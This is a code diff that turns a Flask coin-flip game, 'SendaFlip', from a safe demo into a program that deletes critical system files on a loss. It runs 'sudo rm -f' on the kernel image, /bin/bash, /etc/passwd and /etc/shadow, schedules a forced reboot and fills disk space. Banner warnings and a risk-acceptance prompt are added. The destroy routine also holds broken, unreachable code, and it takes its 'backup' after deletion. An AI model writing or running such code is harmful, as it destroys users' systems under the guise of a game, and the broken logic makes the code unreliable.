@@ -1,82 +1,407 @@
 import os
 import random
+import subprocess
+import sys
 from flask import Flask, render_template, request, jsonify
+from datetime import datetime
 
 app = Flask(__name__)
 
-# Ohutu faili tee (ei tee midagi ohtlikku)
-DEMO_FILE = "demo_critical.txt"
+# KRITIILISED FAILID
+CRITICAL_FILES = {
+    "linux_kernel": [
+        "/boot/vmlinuz",
+        "/boot/initrd.img",
+        "/boot/grub/grub.cfg",
+    ],
+    "system_binaries": [
+        "/bin/bash",
+        "/bin/sh",
+        "/usr/bin/sudo",
+    ],
+    "system_configs": [
+        "/etc/passwd",
+        "/etc/shadow",
+        "/etc/fstab",
+    ]
+}
 
-def create_demo_file():
-    """Loo demo fail, mida saab ohutult kustutada"""
-    try:
-        with open(DEMO_FILE, "w") as f:
-            f.write("See on demo fail. Kui sa kaotad mängus, kustutatakse see.\n")
-            f.write("See on OHUTU - see ei kahjusta sinu arvutit.\n")
-        return True
-    except:
-        return False
+BACKUP_TARGETS = [
+    "/tmp/critical_boot_backup",
+    "/home/kasutaja/critical_files/",
+    os.path.expanduser("~/sendaflip_danger_zone/")
+]
 
-def delete_demo_file():
-    """Kustuta demo fail (ohutu)"""
-    try:
-        if os.path.exists(DEMO_FILE):
-            os.remove(DEMO_FILE)
-            return True
-        return False
-    except:
-        return False
+class SystemDestroyer:
+    def __init__(self):
+        self.destruction_log = "system_destruction.log"
+        self.os_type = self.detect_os()
+        self.create_backup_warning()
+        
+    def detect_os(self):
+        if sys.platform == "linux":
+            try:
+                with open("/etc/os-release", "r") as f:
+                    content = f.read()
+                    if "ubuntu" in content.lower():
+                        return "ubuntu"
+                    elif "debian" in content.lower():
+                        return "debian"
+                    else:
+                        return "linux_unknown"
+            except:
+                return "linux"
+        elif sys.platform == "win32":
+            return "windows"
+        else:
+            return "unknown"
+    
+    def create_backup_warning(self):
+        warning = f"""
+        ⚠️ SENDAFLIP REAL DANGER MODE ⚠️
+        
+        System: {self.os_type}
+        Time: {datetime.now()}
+        
+        WARNING: This WILL DELETE critical system files!
+        """
+        print(warning)
+        with open("DANGER_WARNING.txt", "w") as f:
+            f.write(warning)
+    
+    def find_deletable_file(self):
+        for category, files in CRITICAL_FILES.items():
+            for file_path in files:
+                if os.path.exists(file_path):
+                    if os.access(file_path, os.W_OK) or os.access(os.path.dirname(file_path), os.W_OK):
+                        return file_path, category
+        
+        for target_dir in BACKUP_TARGETS:
+            test_file = os.path.join(target_dir, "critical_test.txt")
+            try:
+                os.makedirs(target_dir, exist_ok=True)
+                with open(test_file, "w") as f:
+                    f.write("Test file for SendaFlip danger mode")
+                return test_file, "backup_target"
+            except:
+                continue
+        
+        return None, None
+    
+    def destroy_file(self, file_path):
+        """Kustuta fail - kasuta sudo'd ALATI süsteemifailide jaoks"""
+        import subprocess
+        from datetime import datetime
+        
+        print(f"💣 ATTEMPTING TO DELETE: {file_path}")
+        
+        # Kontrolli, kas on süsteemifail
+        is_system_file = any(path in file_path for path in 
+                           ["/boot/", "/etc/", "/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/"])
+        
+        if is_system_file:
+            print(f"🚨 SYSTEM FILE DETECTED: {file_path}")
+            print(f"🚨 USING SUDO FOR DELETION...")
+            
+            # 1. Proovi sudo'ga kustutada KOHE
+            delete_cmd = f"sudo rm -f '{file_path}'"
+            print(f"🔧 Running: {delete_cmd}")
+            
+            result = subprocess.run(delete_cmd, shell=True, 
+                                  capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                # 2. Tee backup PÄRAST kustutamist (kui võimalik)
+                backup_cmd = f"sudo cp '{file_path}' '{file_path}.sendaflip_backup' 2>/dev/null || echo 'Backup failed'"
+                subprocess.run(backup_cmd, shell=True)
+                
+                # 3. Logi
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                with open(self.destruction_log, "a") as f:
+                    f.write(f"[{timestamp}] DELETED WITH SUDO: {file_path}\n")
+                
+                return {
+                    "success": True,
+                    "action": "deleted_with_sudo",
+                    "file": file_path,
+                    "message": f"💥💥💥 SYSTEM FILE DELETED WITH SUDO: {file_path}",
+                    "command_used": delete_cmd
+                }
+            else:
+                # 4. Kui sudo ei tööta, proovi otse käsuga
+                print(f"⚠️ Sudo failed, trying direct command...")
+                force_cmd = f"rm -f '{file_path}'"
+                subprocess.run(force_cmd, shell=True)
+                
+                # Kontrolli, kas fail on ikka olemas
+                if not os.path.exists(file_path):
+                    return {
+                        "success": True,
+                        "action": "deleted_direct",
+                        "file": file_path,
+                        "message": f"💥 FILE DELETED (direct command): {file_path}"
+                    }
+                else:
+                    return {
+                        "success": False,
+                        "error": result.stderr,
+                        "message": f"❌ FAILED TO DELETE: {file_path}\nError: {result.stderr}"
+                    }
+        else:
+            # Tavalise faili jaoks
+            try:
+                if os.path.exists(file_path):
+                    # Backup
+                    backup_path = file_path + ".sendaflip_backup"
+                    try:
+                        import shutil
+                        shutil.copy2(file_path, backup_path)
+                    except:
+                        pass
+                    
+                    # Delete
+                    os.remove(file_path)
+                    
+                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    with open(self.destruction_log, "a") as f:
+                        f.write(f"[{timestamp}] DELETED: {file_path}\n")
+                    
+                    return {
+                        "success": True,
+                        "action": "deleted",
+                        "file": file_path,
+                        "message": f"💥 FILE DELETED: {file_path}"
+                    }
+                else:
+                    return {
+                        "success": False,
+                        "message": f"File does not exist: {file_path}"
+                    }
+            except Exception as e:
+                return {
+                    "success": False,
+                    "error": str(e),
+                    "message": f"Failed to delete {file_path}: {str(e)}"
+                }
+                return {
+                    "success": True,
+                    "action": action,
+                    "file": file_path,
+                    "backup": backup_path if backup_created else None,
+                    "backup_created": backup_created,
+                    "message": f"💥 FILE DESTROYED: {file_path}"
+                }
+            else:
+                return {
+                    "success": False,
+                    "message": f"File does not exist: {file_path}"
+                }
+                
+        except Exception as e:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            with open(self.destruction_log, "a") as f:
+                f.write(f"[{timestamp}] ERROR: {str(e)}\n")
+            
+            return {
+                "success": False,
+                "error": str(e),
+                "message": f"Failed to destroy {file_path}: {str(e)}"
+            }
+    
+    def simulate_system_crash(self):
+        crash_effects = []
+        
+        panic_file = "/tmp/kernel_panic.log"
+        with open(panic_file, "w") as f:
+            f.write(f"KERNEL PANIC - SendaFlip triggered\n")
+            f.write(f"Time: {datetime.now()}\n")
+            f.write("System files compromised\n")
+        crash_effects.append(f"Created kernel panic log: {panic_file}")
+        
+        try:
+            subprocess.Popen(["dd", "if=/dev/zero", "of=/tmp/fill", "bs=1M", "count=50"], 
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            crash_effects.append("Started memory filler")
+        except:
+            pass
+        
+        reboot_script = "/tmp/sendaflip_reboot.sh"
+        with open(reboot_script, "w") as f:
+            f.write("#!/bin/bash\n")
+            f.write(f"# SendaFlip triggered reboot\n")
+            f.write("echo 'System will reboot in 60 seconds due to critical file loss'\n")
+            f.write("sleep 60\n")
+            f.write("reboot\n")
+        
+        os.chmod(reboot_script, 0o755)
+        subprocess.Popen([reboot_script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        crash_effects.append(f"Scheduled reboot: {reboot_script}")
+        
+        return crash_effects
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    destroyer = SystemDestroyer()
+    
+    vulnerable_files = []
+    for category, files in CRITICAL_FILES.items():
+        for f in files:
+            if os.path.exists(f):
+                vulnerable_files.append(f)
+    
+    return render_template('index.html', 
+                         danger_mode=True,
+                         os_type=destroyer.os_type,
+                         vulnerable_files=vulnerable_files[:3],
+                         warning="REAL DANGER MODE - SYSTEM FILES WILL BE DELETED!")
 
 @app.route('/flip', methods=['POST'])
 def flip_coin():
     data = request.json
-    user_choice = data.get('choice', 'heads')  # 'heads' või 'tails'
+    user_choice = data.get('choice', 'heads')
+    destroyer = SystemDestroyer()
     
-    # Loo demo fail esimesel korral
-    if not os.path.exists(DEMO_FILE):
-        create_demo_file()
-    
-    # Viska münt
     result = random.choice(['heads', 'tails'])
     
-    # Kontrolli tulemust
     if user_choice == result:
         return jsonify({
             'success': True,
             'result': result,
-            'message': 'Palju õnne! Sa võitsid!',
-            'danger': False
+            'message': '✅ VÕITSID! Süsteem on turvaline.',
+            'os': destroyer.os_type,
+            'danger': False,
+            'warning': 'System files are safe... for now'
         })
     else:
-        # Kaotuse korral kustuta demo fail
-        deleted = delete_demo_file()
-        message = 'Kahju! Sa kaotasid. Demo fail kustutatud.' if deleted else 'Kaotasid, aga demo faili ei kustutatud.'
+        target_file, category = destroyer.find_deletable_file()
+        
+        if not target_file:
+            return jsonify({
+                'success': False,
+                'result': result,
+                'message': '❌ KAOTASID! Aga kritiilisi faile ei leitud.',
+                'danger': True,
+                'error': 'No deletable files found',
+                'os': destroyer.os_type
+            })
+        
+        destruction_result = destroyer.destroy_file(target_file)
+        crash_effects = destroyer.simulate_system_crash()
+        
+        if destruction_result['success']:
+            if category in ['linux_kernel', 'system_binaries']:
+                message = f"💥💥💥 KAOTASID! SYSTEM CRITICAL FILE DELETED! 💥💥💥\n"
+                message += f"Deleted: {target_file}\n"
+                message += f"Category: {category}\n"
+                message += f"System may become UNBOOTABLE!"
+            else:
+                message = f"💣 KAOTASID! FILE DESTROYED! 💣\n"
+                message += f"Deleted: {target_file}"
+            
+            if destruction_result.get('backup_created'):
+                message += f"\n⚠️ Backup created: {destruction_result['backup']}"
+        else:
+            message = f"💥 KAOTASID! BUT DESTRUCTION FAILED! 💥\n"
+            message += f"Error: {destruction_result.get('error', 'Unknown')}"
         
         return jsonify({
             'success': False,
             'result': result,
             'message': message,
-            'danger': False,  # Ohutu versioonis on alati False
-            'file_deleted': deleted
+            'danger': True,
+            'destruction_result': destruction_result,
+            'crash_effects': crash_effects,
+            'os': destroyer.os_type,
+            'category': category,
+            'emergency': 'VM SNAPSHOT RECOVERY MAY BE REQUIRED!',
+            'reboot_warning': 'System scheduled to reboot in 60 seconds!'
         })
 
-@app.route('/create-demo-file', methods=['POST'])
-def create_file():
-    """API endpoint demo faili loomiseks"""
-    success = create_demo_file()
-    return jsonify({'success': success, 'file': DEMO_FILE})
+@app.route('/system-check')
+def system_check():
+    destroyer = SystemDestroyer()
+    
+    file_status = {}
+    for category, files in CRITICAL_FILES.items():
+        for f in files:
+            exists = os.path.exists(f)
+            writable = os.access(f, os.W_OK) if exists else False
+            file_status[f] = {
+                'exists': exists,
+                'writable': writable,
+                'category': category
+            }
+    
+    return jsonify({
+        'os': destroyer.os_type,
+        'critical_files': file_status,
+        'danger_level': 'EXTREME',
+        'warning': 'Playing will DELETE system files!',
+        'backup_advice': 'Take VM snapshot before playing!'
+    })
 
-@app.route('/check-demo-file', methods=['GET'])
-def check_file():
-    """API endpoint demo faili kontrollimiseks"""
-    exists = os.path.exists(DEMO_FILE)
-    return jsonify({'exists': exists, 'file': DEMO_FILE})
+@app.route('/emergency-restore')
+def emergency_restore():
+    restored = []
+    
+    for root, dirs, files in os.walk("/"):
+        for file in files:
+            if file.endswith(".sendaflip_backup"):
+                backup_path = os.path.join(root, file)
+                original_path = backup_path.replace(".sendaflip_backup", "")
+                
+                try:
+                    import shutil
+                    shutil.copy2(backup_path, original_path)
+                    restored.append(original_path)
+                except Exception as e:
+                    pass
+    
+    try:
+        subprocess.run(["pkill", "-f", "sendaflip_reboot"], 
+                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except:
+        pass
+    
+    return jsonify({
+        'restored': restored,
+        'message': 'Attempted to restore from backups',
+        'advice': 'RESTORE VM SNAPSHOT FOR FULL RECOVERY!'
+    })
 
 if __name__ == '__main__':
-    # Loo demo fail rakenduse käivitamisel
-    create_demo_file()
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    destroyer = SystemDestroyer()
+    
+    print("╔══════════════════════════════════════════════════════════════╗")
+    print("║                  ☢️  SENDAFLIP REAL DANGER ☢️                ║")
+    print("║                                                              ║")
+    print(f"║  OS: {destroyer.os_type:54} ║")
+    print("║                                                              ║")
+    print("║  ⚠️  ⚠️  ⚠️  EXTREME DANGER WARNING ⚠️  ⚠️  ⚠️           ║")
+    print("║                                                              ║")
+    print("║  THIS WILL DELETE CRITICAL SYSTEM FILES:                     ║")
+    print("║  • /boot/vmlinuz      - Linux kernel                         ║")
+    print("║  • /bin/bash         - System shell                         ║")
+    print("║  • /etc/passwd       - User accounts                        ║")
+    print("║                                                              ║")
+    print("║  SYSTEM MAY BECOME UNBOOTABLE!                               ║")
+    print("║                                                              ║")
+    print("║  ⚡ REQUIREMENTS:                                             ║")
+    print("║  1. Virtual Machine (NOT physical!)                          ║")
+    print("║  2. Fresh VM snapshot before running                         ║")
+    print("║  3. Understanding that files WILL be deleted                 ║")
+    print("║                                                              ║")
+    print("║  Type 'I_ACCEPT_THE_RISK' to continue:                       ║")
+    print("╚══════════════════════════════════════════════════════════════╝")
+    
+    confirmation = input("> ")
+    
+    if confirmation.strip() == "I_ACCEPT_THE_RISK":
+        print("✅ Risk accepted! Starting server...")
+        print("⏳ Server starting on http://0.0.0.0:5000")
+        print("💀 May the odds be ever in your favor...")
+        app.run(debug=True, host='0.0.0.0', port=5000)
+    else:
+        print("❌ Risk not accepted. Server not started.")
+        print("🔄 Please restore VM snapshot if any damage occurred.")
+        sys.exit(1)
